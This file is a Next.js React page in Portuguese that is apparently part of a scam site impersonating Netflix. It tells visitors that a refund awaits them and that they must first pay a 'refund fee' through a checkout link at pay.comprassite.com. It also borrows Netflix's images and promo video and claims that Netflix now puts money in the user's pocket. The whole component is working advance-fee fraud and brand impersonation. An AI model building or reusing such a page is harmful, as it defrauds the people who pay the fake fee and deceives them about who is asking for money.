'use client';

import { Footer } from "@/components/footer";
import { Header } from "@/components/header";
import { useBalance } from "@/hook/useBalance";
import Banner from '@/assets/banner.png';
import Reembolso from '@/assets/reembolso.png';
import Image from "next/image";
import Link from "next/link";


export default function Up5() {

  const { balance } = useBalance()
  return (
    <>

      <Header />

      <div className="relative flex flex-col md:flex-row flex-grow w-full">
        <Image alt="Banner" src={Banner} className="object-cover h-[40rem]" />
        <main className="absolute inset-x-0 top-24 md:top-48 flex flex-col text-white text-center px-4 items-center">

          <div className="max-w-[40rem] space-y-6">
          <div className="bg-red-700 text-white p-4 rounded-md text-xl font-bold w-full mt-6 flex items-center flex-col ">
             <Image src={Reembolso} className="w-20 h-20 mb-4" alt="Logo Pix" />
            SOLICITE SEU REEMBOLSO AGORA!
          </div>
          <p className="mt-4 text-lg font-medium text-justify">
           Está pronto para receber seu reembolso? Para concluir o processo e liberar o valor, é necessário pagar uma taxa de reembolso.
          </p>
          <p className="mt-4 text-lg font-medium text-justify">O pagamento da taxa de reembolso é necessário para que possamos processar sua solicitação e transferir o valor para sua conta.</p>
        <Link href="https://pay.comprassite.com/checkout/d01c4d4f-d028-4990-87cd-c52df99ba32b" >
        <button className= "bg-red-700 text-white font-bold py-3 px-6 rounded-md text-lg mt-6 botao-pulsante">
            Libere agora mesmo o seu Reembolso!
        </button>
          </Link>
          
          </div>
        </main>
      </div>



      <section className="border-b-8 border-gray-900 p-6">
        <div className="mx-auto text-white">
          <div className="flex flex-col md:flex-row items-center">
            <div className="md:w-1/2 flex flex-col justify-center items-center md:items-start text-center md:text-left px-4">
              <div className="max-w-[350px]">
                <h2 className="text-4xl md:text-[3.125rem] font-bold">Aproveite.</h2>
                <p className="mt-4 text-lg md:text-xl">
                  A Netflix que você adora agora colocando dinheiro no seu bolso
                </p>
              </div>
            </div>
            <div className="md:w-1/2 mt-8 md:mt-0 relative">
              <div className="relative z-10">
                <Image
                  src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/tv.png"
                  alt="TV"
                  width={640}
                  height={480}
                  className="w-full h-auto"
                />
              </div>
              <video
                autoPlay
                playsInline
                muted
                loop
                className="absolute top-[21%] left-[13.2%] max-w-[72.7%]"
              >
                <source
                  src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/video-tv-0819.m4v"
                  type="video/mp4"
                />
              </video>
            </div>
          </div>
        </div>
      </section>
      <Footer />
    </>
  );
}
